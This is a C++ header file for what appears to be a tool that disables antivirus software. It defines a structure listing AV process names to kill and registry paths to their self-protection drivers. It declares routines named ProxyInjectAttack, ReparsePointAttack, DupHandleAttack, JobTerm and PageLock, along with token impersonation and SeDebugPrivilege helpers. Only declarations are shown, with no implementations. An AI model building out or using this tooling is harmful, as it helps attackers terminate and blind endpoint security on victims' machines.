#include <stdio.h>
#include <tchar.h>
#include <fstream>
#include <string>
#include <vector>
#include <iostream>
#include <windows.h>
#include <TlHelp32.h>
#include "ntdll.h"
#include "AppHelpDef.h"
#pragma comment(lib, "ntdll.lib")

template <int N> struct AV_struct
{
	//Count of processes to kill
	static const int process_name_count = N;
	//General name of AV
	std::string name_av;
	//Array of the processes names to kill
	std::wstring process_name[N];
	//AV-Reg information path
	std::wstring reg_path_install;
	std::wstring reg_path_install_subkey;
	//using wow64 registry path or not
	bool wow64_reg;
	//AV-reg path to self-protect module
	std::wstring reg_path_sp;	//HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services
	std::wstring reg_path_sp_key;	//aswSP
	std::wstring sdb_name;
};


//Methods.cpp
bool ProxyInjectAttack(std::wstring av_image_path, std::wstring proc_name);
int get_size_of_image(char *read_proc);
int get_entrypoint(char *read_proc);
bool JobTerm(HANDLE full_acc_handle);
typedef NTSTATUS(NTAPI* _NtCreatePagingFile)(IN PUNICODE_STRING PageFileName,
	IN PLARGE_INTEGER MiniumSize,
	IN PLARGE_INTEGER MaxiumSize,
	OUT PLARGE_INTEGER ActualSize OPTIONAL);
bool ReparsePointAttack(std::wstring av_image_path);
HANDLE OpenLinkHandle(LPCTSTR pszPath);
void GetPrivilege(LPCWSTR priv);
bool RegSafe(std::wstring av_reg_path_sp, std::wstring av_reg_path_sp_key);


//Memory.cpp
HANDLE Heap_init(void);
void Heap_Destroy(void);

//Utils.cpp
NTSTATUS Query_Procsinfo(LPVOID* buffer_, SYSTEM_INFORMATION_CLASS sys_inf_class);
NTSTATUS Query_TokenInfo(LPVOID* buffer_, HANDLE token_handle, TOKEN_INFORMATION_CLASS token_inf_class);
BOOL IsUserAdmin(void);
bool GetAVpath(std::wstring av_reg_path, std::wstring av_reg_path_subkey, std::wstring &install_path, bool wow_64);
bool CheckToken_group(PTOKEN_PRIMARY_GROUP tn_group);
bool Impersonate_ThreadToken(PCLIENT_ID clientId_str);
bool Impersonate_Main(void);
bool IsWow64();
void MainPrivUtil(void);
int  AdjustPriv(unsigned int priv_);
unsigned int EnumProc(std::wstring process_name, std::vector <unsigned int> &array_PID);
BOOL DupHandleAttack(unsigned int pid_);
bool PageLock(std::wstring av_image_path);
PVOID GetLibraryProcAddress(PSTR LibraryName, PSTR ProcName);

//CONSTANTS
#define STATUS_BUFFER_TOO_SMALL ((NTSTATUS)0xC0000023L)
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

#define HEAP_SIZE					  8048
#define ADJUST_FAILED				  0x0
#define ADJUST_OK				      0x1
#define ADJUST_FAILED_LINKED_TOKEN    0x2
#define sub_count						1
#define CURRENT_THREAD				   -2
#define SeDebugPrivilege              0x14
#define SeCreatePagefilePrivilege     0xf
#define DUPLICATE_SAME_ATTRIBUTES	  0x00000004